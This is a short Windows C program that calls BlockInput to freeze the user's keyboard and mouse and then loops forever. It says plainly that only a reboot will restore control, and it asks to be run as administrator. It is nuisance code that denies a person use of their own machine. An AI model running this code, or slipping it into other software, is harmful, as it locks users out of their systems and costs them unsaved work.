#include <windows.h>
#include <stdio.h>

int main() {
    printf("Your keyboard and mouse will blocked in 5 seconds...\n");

    if (BlockInput(TRUE)) {
        printf("Now only rebooting your PC will help...\n");
        while (1) {
            int i = 0;
        }
    }
    else {
        printf("Error: You should run this program with administartor permissions!\n");
    }

    return 0;
}
